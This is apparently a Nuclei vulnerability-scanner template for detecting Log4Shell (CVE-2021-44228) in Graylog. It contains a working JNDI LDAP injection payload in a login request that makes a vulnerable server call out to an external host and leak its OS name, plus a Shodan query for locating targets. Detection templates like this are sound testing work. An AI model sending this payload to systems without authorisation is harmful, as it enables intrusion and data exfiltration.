id: graylog-log4j
info:
  author: DhiyaneshDK
  description: Graylog uses the Log4j 2 Java library to record its own log information.
    Versions of this library earlier than 2.15.0 are vulnerable to a remote code execution
    attack, specifically when specially crafted values sent as user input will be
    logged by Graylog.
  metadata:
    shodan-query: title:"Graylog Web Interface"
    verified: true
  name: GrayLog - Remote Code Execution (Apache Log4j)
  reference:
  - https://www.graylog.org/post/graylog-update-for-log4j
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,graylog
requests:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST /api/system/sessions HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

    Accept: application/json

    Accept-Language: en-US,en;q=0.5

    Accept-Encoding: gzip, deflate

    X-Requested-With: XMLHttpRequest

    X-Requested-By: XMLHttpRequest

    Content-Type: application/json

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}


    {"username":"${jndi:ldap://${sys:os.name}.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}

    '
